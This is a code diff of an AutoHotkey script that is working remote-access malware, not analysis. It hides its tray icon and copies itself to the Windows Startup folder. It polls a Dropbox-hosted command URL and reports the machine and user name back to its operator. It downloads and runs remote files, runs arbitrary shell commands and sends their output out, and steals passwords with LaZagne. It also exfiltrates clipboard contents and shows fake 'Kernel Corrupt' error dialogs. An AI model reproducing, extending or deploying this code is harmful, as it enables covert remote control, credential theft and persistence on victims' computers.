@@ -1,19 +1,41 @@
 ﻿#SingleInstance force
-MsgBox, This version of the software isn´t compatible with your os. Please contact your software provider.
-IfNotExist, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
-	FileCopy, %A_ScriptName%, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+#NoTrayIcon
+if A_WorkingDir != C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+;	annoy(5)
 binurl := "no"
 	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 	whr.Open("GET", "https://www.dropbox.com/s/aitm2yv03u64zit/bin-url.txt?raw=1", true)
 	whr.Send()
 	whr.WaitForResponse()
-	binurl := whr.ResponseText
-	temp:=  binurl "?log=" A_ComputerName "--" A_UserName ":-_linked_in!"
+	binraw := whr.ResponseText
+	StringSplit, binArr,binraw,;
+	binurl := binArr1
+if 1 = update 
+{
+	temp:=  binurl "log=" A_ComputerName "--" A_UserName ":-_updated!"
 	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 	whr.Open("GET", temp , true)
 	whr.Send()
 	whr.WaitForResponse()
 	temp := whr.ResponseText
+	filnam := StrReplace(A_ScriptName, " .exe" , ".exe")
+	filedelete, %filnam%
+}
+
+if	binArr2 = 1
+{
+	IfNotExist, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
+	{
+		FileCopy, %A_ScriptName%, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+	}
+}
+	temp:=  binurl "log=" A_ComputerName "--" A_UserName ":-_linked_in!"
+	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+	whr.Open("GET", temp , true)
+	whr.Send()
+	whr.WaitForResponse()
+	temp := whr.ResponseText
+;OnExit("ExitFunc")
 sleept := 10000
 counter := 0
 last_com_id := 0
@@ -32,9 +54,9 @@ loop
 	StringSplit,BaseArray,raw1,;
 	raw := BaseArray1
 	;MsgBox % raw
-	StringSplit, array, raw,:
+	StringSplit, array, raw,°
 	com_id := array1
-	command := array2
+	commandtemp := array2
 	;soundBeep
 	temp := -1
 	;msgBox %com_id%-%last_com_id%
@@ -45,16 +67,74 @@ loop
 	}
 	if counter = 60
 	{
-	counter := 1
-	temp :=  binurl "?log=" A_ComputerName "--" A_UserName ":-_still_online!"
+		counter := 1
+		temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!"
+		whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+		whr.Open("GET",temp, true)
+		whr.Send()
+		whr.WaitForResponse()
+		temp := whr.ResponseText	
+	}
+	if (not com_id = last_com_id) or (com_id = 666)
+	{
+	Loop, parse, commandtemp,^
+	{
+		outar := Interpret(A_LoopField,binurl,mousean,sleept)
+		mousean := outar[1]
+		sleept := outar[2]
+	}
+	}
+	last_com_id := com_id
+	counter := counter + 1
+}
+
+~LButton::
+	if mousean = 1
+	{
+		MouseGetPos,X,Y
+		X := X-70
+		Y := Y-80
+		Gui, Show, X%X% Y%Y%
+		Random
+	}
+return
+
+annoy(val)
+{
+loop{
+	runwait cmd /c ipconfig && cd C:\windows\system32 && dir 
+	if A_Index > 1
+		MsgBox, 4405,Kernel Corrupt!,It seems like your windows kernel is corrupt! `nPlease reinstall Windows or contact your local repair shop!
+	else
+		MsgBox, 4373,Fatal error while installing!,There was a fatal error while installing! Please try again or contact the software distributor!
+	
+	IfMsgBox Cancel
+		break
+}
+}
+
+ExitFunc(ExitReason, ExitCode)
+{
+	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+	whr.Open("GET", "https://www.dropbox.com/s/aitm2yv03u64zit/bin-url.txt?raw=1", true)
+	whr.Send()
+	whr.WaitForResponse()
+	binraw2 := whr.ResponseText
+	StringSplit, bin2Arr,binraw2, ;
+	binurl := bin2Arr1
+	
+	temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_closing_with_reason:-" ExitReason "_" ExitCode
 	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 	whr.Open("GET",temp, true)
 	whr.Send()
 	whr.WaitForResponse()
-	temp := whr.ResponseText	
-	}
-	if (not com_id = last_com_id) or (com_id = 666)
-	{
+	temp := whr.ResponseText
+	
+}
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+Interpret(command,binurl,mousean,sleept)
+{
 		StringSplit, SubArray, command, %A_Space%
 
 		
@@ -63,19 +143,106 @@ loop
 		
 			if SubArray2 = mouse
 			{
-				UrlDownloadToFile,https://www.dropbox.com/s/m5wd1zem790jdyd/pedo.png?dl=1,pedo.png
-				sleep 5000
-				Gui, Add, Pic, w100 h100, pedo.png
-				mousean := SubArray3
-			}
-			else if SubArray2 = report
-			{
-				temp :=  binurl "?log=" A_ComputerName "--" A_UserName ":-_still_online!"
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-mouse_annoy_mode_now:-" SubArray3
 				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 				whr.Open("GET",temp, true)
 				whr.Send()
 				whr.WaitForResponse()
 				temp := whr.ResponseText
+				UrlDownloadToFile,https://www.dropbox.com/s/m5wd1zem790jdyd/pedo.png?dl=1,pedo.png
+				sleep 5000
+				Gui, Add, Pic, w100 h100, pedo.png
+				mousean := SubArray3
+			}
+			else if SubArray2 = urlrun
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-downloading_file_from:-" SubArray3 "-:to:-" SubArray4 "-:and_running_it!"
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				UrlDownloadToFile,%SubArray3%,%SubArray4%
+				run %SubArray4%,,%SubArray5%
+			}
+			else if SubArray2 = update
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-dowloading_update_exe_from:-" SubArray3
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				filnam := StrReplace(A_ScriptName, ".exe" , " .exe")
+				UrlDownloadToFile,%SubArray3%,filnam
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-rehooking!"
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				run, cmd /c %A_WorkingDir%\filnam update
+				exitapp
+			}
+			else if SubArray2 = report
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!"
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+			}
+			else if Subarray2 = sendcon
+			{
+			tempcom := SubStr(command,15)
+			;run, cmd.exe /k echo off & cls & %tempcom% & title OKE
+			;winwait, OKE
+			Value := ComObjCreate("WScript.Shell").Exec("cmd.exe /q /c " tempcom).StdOut.ReadAll()
+			StringReplace, Value, Value, `r`n, ~, All
+			Vallen := Strlen(Value) + 50
+			;msgBox, %Vallen%
+			loopcount1 := Vallen/8000
+			loopcount2 := ceil(loopcount1)
+			if loopcount2 > 1
+			{
+			temp :=  binurl "sendc=" A_ComputerName "--" A_UserName ":-beginning_output_stream_of_:-" tempcom
+			whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+			whr.Open("GET",temp, true)
+			whr.Send()
+			whr.WaitForResponse()
+			temp := whr.ResponseText
+			loop %loopcount2% {
+				index := A_Index -1
+				num := index * 8000
+				tempStr := SubStr(Value,num,7999)
+				temp :=  binurl "data=" A_ComputerName "--" A_UserName ":-sendc:-" tempStr
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+			}
+			temp :=  binurl "sendc=" A_ComputerName "--" A_UserName ":-_output_stream_ended!"
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+			}
+			else
+			{
+			
+				temp :=  binurl "sendc=" A_ComputerName "--" A_UserName ":-output_of_:-" tempcom "-:-" Value
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+			
+			
+			
+			}
 			}
 			else if SubArray2 = lazagne
 			{
@@ -101,7 +268,7 @@ loop
 				data2 := SubStr(data,510)
 				StringReplace, data3, data2,Password found !!!, ``, All  ; Replace each <br> with an accent.
 				StringSplit, dataray, data3, ``  ; Split the string based on the accent character.
-					temp :=  binurl "?laz=" A_ComputerName "--" A_UserName ":-_beginning_lazagne_stream!"
+					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_beginning_lazagne_stream!"
 					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 					whr.Open("GET",temp, true)
 					whr.Send()
@@ -110,14 +277,14 @@ loop
 					
 				loop %dataray0%
 				{
-					temp := binurl "?data=" dataray%A_Index%
+					temp := binurl "data=" dataray%A_Index%
 					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 					whr.Open("GET", temp, true)
 					whr.Send()
 					whr.WaitForResponse()
 					raw1 := whr.ResponseText
 				}
-					temp :=  binurl "?laz=" A_ComputerName "--" A_UserName ":-_lazagne_stream_ended!"
+					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_lazagne_stream_ended!"
 					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 					whr.Open("GET",temp, true)
 					whr.Send()
@@ -126,26 +293,44 @@ loop
 			}
 			else if SubArray2 = unhook
 			{
+					temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_unhooking_machine,c_u_next_startup!"
+					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+					whr.Open("GET",temp, true)
+					whr.Send()
+					whr.WaitForResponse()
+					temp := whr.ResponseText
 				ExitApp
 			}
 			else if SubArray2 = cure
 			{
+					temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_curing_machine,Good_bye!"
+					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+					whr.Open("GET",temp, true)
+					whr.Send()
+					whr.WaitForResponse()
+					temp := whr.ResponseText
 				filedelete,C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
 				ExitApp
 			}
 			else if SubArray2 = sleeptime
 			{
+					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_update_interval_now:-" SubArray3
+					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+					whr.Open("GET",temp, true)
+					whr.Send()
+					whr.WaitForResponse()
+					temp := whr.ResponseText
 				sleept := SubArray3
 			}
 			else if SubArray2 = ducky
 			{
 				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
-				whr.Open("GET",SubArray3, true)
+				whr.Open("GET", SubArray3 , true)
 				whr.Send()
 				whr.WaitForResponse()
 				duckyscript := whr.ResponseText
 				
-					temp :=  binurl "?laz=" A_ComputerName "--" A_UserName ":-_duckyng_contents_of:-" SubArray3
+					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_duckyng_contents_of:-" SubArray3
 					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 					whr.Open("GET",temp, true)
 					whr.Send()
@@ -238,7 +423,7 @@ loop
 				
 				else if command = CLIP
 				{
-					temp :=  binurl "?laz=" A_ComputerName "--" A_UserName ":-_contents_of_Clipboard:-" ClipBoard
+					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_contents_of_Clipboard:-" ClipBoard
 					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 					whr.Open("GET",temp, true)
 					whr.Send()
@@ -248,27 +433,16 @@ loop
 				sleep, defdel
 				}
 			}
-		}else{
+		}
+		else if command !=
+		{
 			run cmd /c %command%
-			temp :=  binurl "?log=" A_ComputerName "--" A_UserName ":- ran: " command
+			temp :=  binurl "log=" A_ComputerName "--" A_UserName ":- ran: " command
 			whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 			whr.Open("GET",temp, true)
 			whr.Send()
 			whr.WaitForResponse()
-	temp := whr.ResponseText
+			temp := whr.ResponseText
 		}
+		return [mousean,sleept]
 	}
-	last_com_id := com_id
-	counter := counter + 1
-}
-
-~LButton::
-	if mousean = 1
-	{
-		MouseGetPos,X,Y
-		X := X-70
-		Y := Y-80
-		Gui, Show, X%X% Y%Y%
-		Random
-	}
-return
